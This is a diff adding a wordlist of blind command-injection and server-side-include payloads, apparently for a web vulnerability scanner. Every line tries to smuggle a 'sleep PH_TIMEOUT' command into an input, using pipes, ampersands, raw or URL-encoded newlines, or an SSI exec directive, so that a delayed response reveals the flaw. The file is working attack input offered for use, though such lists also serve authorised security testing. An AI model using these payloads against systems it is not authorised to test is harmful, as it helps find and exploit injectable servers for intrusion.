@@ -1,0 +1,32 @@
+&lt;!--#exec%20cmd=&quot;sleep PH_TIMEOUT&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;sleep PH_TIMEOUT;--&gt;
+/index.html|sleep PH_TIMEOUT|
+"|sleep PH_TIMEOUT|"
+'|sleep PH_TIMEOUT|'
+|sleep PH_TIMEOUT
+|sleep PH_TIMEOUT|
+"|sleep PH_TIMEOUT|"
+'|sleep PH_TIMEOUT|'
+"||sleep PH_TIMEOUT|"
+'||sleep PH_TIMEOUT|'
+||sleep PH_TIMEOUT|
+"\nsleep PH_TIMEOUT\n"
+'\nsleep PH_TIMEOUT\n'
+\nsleep PH_TIMEOUT\n
+\nsleep PH_TIMEOUT|
+|sleep PH_TIMEOUT\n
+a)|sleep PH_TIMEOUT
+a|sleep PH_TIMEOUT
+|sleep PH_TIMEOUT
+%0Asleep PH_TIMEOUT
+%22%0Asleep PH_TIMEOUT%0A%22
+%27%0Asleep PH_TIMEOUT%0A%27
+%0Asleep PH_TIMEOUT%0A
+"& sleep PH_TIMEOUT &"
+'& sleep PH_TIMEOUT &'
+& sleep PH_TIMEOUT &
+& sleep PH_TIMEOUT &
+%0a sleep PH_TIMEOUT %0a
+| sleep PH_TIMEOUT
+& sleep PH_TIMEOUT
+%0a sleep PH_TIMEOUT %0a
